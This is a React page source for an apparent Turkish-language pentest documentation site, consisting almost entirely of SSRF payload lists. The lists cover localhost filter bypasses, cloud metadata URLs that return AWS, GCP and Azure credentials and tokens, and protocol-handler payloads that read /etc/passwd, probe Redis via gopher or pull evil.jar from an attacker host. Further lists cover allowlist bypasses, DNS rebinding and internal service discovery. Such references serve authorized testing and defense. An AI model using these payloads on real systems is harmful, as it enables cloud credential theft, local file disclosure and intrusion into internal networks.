"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "localhost", title: "Localhost / Internal IP", level: 2 },
  { id: "cloud-metadata", title: "Cloud Metadata", level: 2 },
  { id: "protocol-handlers", title: "Protocol Handlers", level: 2 },
  { id: "url-bypass", title: "URL Bypass Teknikleri", level: 2 },
  { id: "dns-rebinding", title: "DNS Rebinding", level: 2 },
  { id: "internal-service", title: "Internal Service Discovery", level: 2 },
]

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function SSRFPage() {
  return (
    <>
    <TableOfContents items={tocItems} />
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">SSRF (Server-Side Request Forgery)</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          Sunucunun dahili veya harici kaynaklara istek göndermesini sağlayan zafiyet.
          Cloud metadata, internal services ve port scanning için kullanılır.
        </p>
      </motion.div>

      <Callout type="warning" title="Kritik">
        Cloud ortamlarında (AWS, GCP, Azure) metadata endpoint&apos;leri hassas bilgiler içerir.
        SSRF ile credential theft mümkündür.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="localhost" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Localhost / Internal IP</h2>
        <PayloadList
          title="Localhost Bypass"
          initialShow={8}
          payloads={[
            { code: `http://127.0.0.1`, note: "Klasik localhost" },
            { code: `http://localhost`, note: "Hostname" },
            { code: `http://127.0.0.1:80`, note: "Port belirtme" },
            { code: `http://127.0.0.1:443`, note: "HTTPS portu" },
            { code: `http://127.0.0.1:22`, note: "SSH port scan" },
            { code: `http://127.1`, note: "Kısa format" },
            { code: `http://0.0.0.0`, note: "All interfaces" },
            { code: `http://0`, note: "Sıfır = localhost" },
            { code: `http://127.0.1`, note: "Alternatif format" },
            { code: `http://127.000.000.001`, note: "Padding ile bypass" },
            { code: `http://2130706433`, note: "Decimal IP (127.0.0.1)" },
            { code: `http://0x7f000001`, note: "Hex IP" },
            { code: `http://0177.0.0.1`, note: "Octal format" },
            { code: `http://[::1]`, note: "IPv6 localhost" },
            { code: `http://[0:0:0:0:0:0:0:1]`, note: "IPv6 full format" },
            { code: `http://[::ffff:127.0.0.1]`, note: "IPv6 mapped IPv4" },
            { code: `http://①②⑦.⓪.⓪.①`, note: "Unicode numbers" },
            { code: `http://127。0。0。1`, note: "Fullwidth dot" },
            { code: `http://127%2e0%2e0%2e1`, note: "URL encoded dots" },
            { code: `http://localtest.me`, note: "127.0.0.1'e resolve olan domain" },
            { code: `http://spoofed.burpcollaborator.net`, note: "DNS rebinding için" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="cloud-metadata" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Cloud Metadata</h2>
        <PayloadList
          title="AWS Metadata"
          initialShow={8}
          payloads={[
            { code: `http://169.254.169.254/latest/meta-data/`, note: "AWS metadata root" },
            { code: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, note: "IAM role listesi" },
            { code: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`, note: "AWS credentials!" },
            { code: `http://169.254.169.254/latest/dynamic/instance-identity/document`, note: "Instance bilgisi" },
            { code: `http://169.254.169.254/latest/user-data`, note: "User data scripts" },
            { code: `http://169.254.169.254/latest/meta-data/hostname`, note: "Internal hostname" },
            { code: `http://169.254.169.254/latest/meta-data/local-ipv4`, note: "Internal IP" },
            { code: `http://[fd00:ec2::254]/latest/meta-data/`, note: "IPv6 AWS metadata" },
          ]}
        />

        <PayloadList
          title="GCP Metadata"
          initialShow={5}
          payloads={[
            { code: `http://metadata.google.internal/computeMetadata/v1/`, note: "GCP metadata - Header gerekir: Metadata-Flavor: Google" },
            { code: `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`, note: "GCP access token" },
            { code: `http://metadata.google.internal/computeMetadata/v1/project/project-id`, note: "Project ID" },
            { code: `http://metadata.google.internal/computeMetadata/v1/instance/attributes/`, note: "Instance attributes" },
          ]}
        />

        <PayloadList
          title="Azure Metadata"
          initialShow={5}
          payloads={[
            { code: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, note: "Azure metadata - Header: Metadata:true" },
            { code: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`, note: "Azure access token" },
            { code: `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01`, note: "Compute bilgisi" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="protocol-handlers" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Protocol Handlers</h2>
        <PayloadList
          title="Farklı Protokoller"
          initialShow={8}
          payloads={[
            { code: `file:///etc/passwd`, note: "Local file read" },
            { code: `file:///c:/windows/win.ini`, note: "Windows file" },
            { code: `dict://localhost:11211/stats`, note: "Memcached info" },
            { code: `gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a`, note: "Redis info via gopher" },
            { code: `gopher://localhost:3306/_`, note: "MySQL probe" },
            { code: `ftp://localhost:21`, note: "FTP banner grab" },
            { code: `sftp://localhost:22`, note: "SFTP probe" },
            { code: `ldap://localhost:389`, note: "LDAP probe" },
            { code: `tftp://localhost:69/file`, note: "TFTP read" },
            { code: `jar:http://attacker.com/evil.jar!/file.txt`, note: "JAR protocol" },
            { code: `netdoc:///etc/passwd`, note: "Java netdoc" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="url-bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">URL Bypass Teknikleri</h2>
        <PayloadList
          title="Whitelist/Blacklist Bypass"
          initialShow={8}
          payloads={[
            { code: `http://evil.com#@trusted.com`, note: "Fragment bypass" },
            { code: `http://trusted.com@evil.com`, note: "Credentials bypass" },
            { code: `http://evil.com\\@trusted.com`, note: "Backslash bypass" },
            { code: `http://trusted.com.evil.com`, note: "Subdomain bypass" },
            { code: `http://evil.com/trusted.com`, note: "Path bypass" },
            { code: `http://evil.com?trusted.com`, note: "Query bypass" },
            { code: `http://trusted.com%252f@evil.com`, note: "Double encoding" },
            { code: `http://evil.com%09trusted.com`, note: "Tab karakter" },
            { code: `http://evil.com%00trusted.com`, note: "Null byte" },
            { code: `https://evil.com/〱trusted.com`, note: "Unicode normalization" },
            { code: `http://ⓔⓥⓘⓛ.com`, note: "Unicode domain" },
            { code: `http://evil。com`, note: "Fullwidth karakterler" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="dns-rebinding" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">DNS Rebinding</h2>
        <PayloadList
          title="DNS Rebinding Payloadları"
          initialShow={5}
          payloads={[
            { code: `http://A.B.C.D.1time.169.254.169.254.forever.rebind.network`, note: "İlk istek public IP, sonraki metadata" },
            { code: `http://spoofed.burpcollaborator.net`, note: "Burp Collaborator ile DNS rebinding" },
            { code: `http://make-169.254.169.254-rr.1u.ms`, note: "1u.ms rebinding servisi" },
            { code: `http://7f000001.c0a80001.rbndr.us`, note: "rbndr.us - 127.0.0.1 ile 192.168.0.1 arası" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="internal-service" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Internal Service Discovery</h2>
        <PayloadList
          title="Common Internal Services"
          initialShow={8}
          payloads={[
            { code: `http://192.168.0.1`, note: "Default gateway" },
            { code: `http://10.0.0.1`, note: "Private range" },
            { code: `http://172.16.0.1`, note: "Private range" },
            { code: `http://localhost:8080`, note: "Common app port" },
            { code: `http://localhost:3000`, note: "Node.js default" },
            { code: `http://localhost:5000`, note: "Flask default" },
            { code: `http://localhost:9200`, note: "Elasticsearch" },
            { code: `http://localhost:6379`, note: "Redis" },
            { code: `http://localhost:27017`, note: "MongoDB" },
            { code: `http://localhost:11211`, note: "Memcached" },
            { code: `http://localhost:5432`, note: "PostgreSQL" },
            { code: `http://localhost:3306`, note: "MySQL" },
            { code: `http://kubernetes.default.svc`, note: "Kubernetes API" },
            { code: `http://docker.sock`, note: "Docker socket" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test İpuçları">
        1. Burp Collaborator veya webhook.site ile out-of-band test yapın
        2. Response time farklarıyla port tarama yapın
        3. Error mesajlarından internal IP&apos;leri çıkarın
        4. PDF/Image generator&apos;larda SSRF aramayı unutmayın
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/web/csrf" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>CSRF</span>
        </Link>
        <Link href="/docs/web/xxe" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>XXE</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
    </>
  )
}
